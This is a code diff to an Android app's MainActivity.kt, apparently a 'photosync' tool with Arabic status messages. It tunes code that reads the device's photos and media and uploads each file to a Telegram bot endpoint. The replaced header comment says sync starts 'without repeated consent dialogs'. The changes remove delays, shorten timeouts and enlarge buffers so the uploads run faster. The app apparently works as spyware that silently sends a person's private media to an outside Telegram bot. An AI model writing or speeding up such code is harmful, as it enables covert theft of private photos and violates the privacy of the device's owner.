@@ -1,5 +1,5 @@
 // language: Kotlin, file: MainActivity.kt, target: Android (API 26+), Gradle
-// *Auto-starts sync after permissions are granted without repeated consent dialogs on startup or card taps*
+// *Faster sequential photo & media streaming with larger buffers, tighter timeouts, and no artificial delay*
 package com.example.photosync
 
 import android.Manifest
@@ -341,7 +341,7 @@ class MainActivity : AppCompatActivity() {
                     if (attempt < maxRetries) {
                         updateStatus("إعادة المحاولة ($attempt/$maxRetries)...")
                         try {
-                            Thread.sleep(2500L * attempt)
+                            Thread.sleep(1000L * attempt)
                         } catch (_: InterruptedException) {
                             return@execute
                         }
@@ -537,7 +537,6 @@ class MainActivity : AppCompatActivity() {
         for ((index, uri) in uris.withIndex()) {
             updateStatus("إرسال $label (${index + 1}/$total)...")
             postTelegramMedia(uri, endpointMethod, fieldName, filePrefix, mimeType)
-            Thread.sleep(500L)
         }
     }
 
@@ -547,8 +546,8 @@ class MainActivity : AppCompatActivity() {
 
         val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
             requestMethod = "POST"
-            connectTimeout = 60_000
-            readTimeout = 120_000
+            connectTimeout = 20_000
+            readTimeout = 30_000
             doOutput = true
             doInput = true
             setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
@@ -576,7 +575,7 @@ class MainActivity : AppCompatActivity() {
         filePrefix: String,
         mimeType: String
     ) {
-        val boundary = "----AndroidBoundary${System.currentTimeMillis()}"
+        val boundary = "----AndroidBoundary${System.nanoTime()}"
         val lineEnd = "\r\n"
         val twoHyphens = "--"
         val endpoint = "https://api.telegram.org/bot$botToken/$endpointMethod"
@@ -584,8 +583,8 @@ class MainActivity : AppCompatActivity() {
         val inputStream: InputStream = contentResolver.openInputStream(mediaUri) ?: return
         val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
             requestMethod = "POST"
-            connectTimeout = 60_000
-            readTimeout = 120_000
+            connectTimeout = 20_000
+            readTimeout = 45_000
             doInput = true
             doOutput = true
             useCaches = false
@@ -601,11 +600,11 @@ class MainActivity : AppCompatActivity() {
 
                     out.writeBytes(twoHyphens + boundary + lineEnd)
                     out.writeBytes(
-                        "Content-Disposition: form-data; name=\"$fieldName\"; filename=\"${filePrefix}_${System.currentTimeMillis()}\"$lineEnd"
+                        "Content-Disposition: form-data; name=\"$fieldName\"; filename=\"${filePrefix}_${System.nanoTime()}\"$lineEnd"
                     )
                     out.writeBytes("Content-Type: $mimeType$lineEnd$lineEnd")
 
-                    val buffer = ByteArray(8192)
+                    val buffer = ByteArray(32768)
                     var bytesRead: Int
                     while (stream.read(buffer).also { bytesRead = it } != -1) {
                         out.write(buffer, 0, bytesRead)
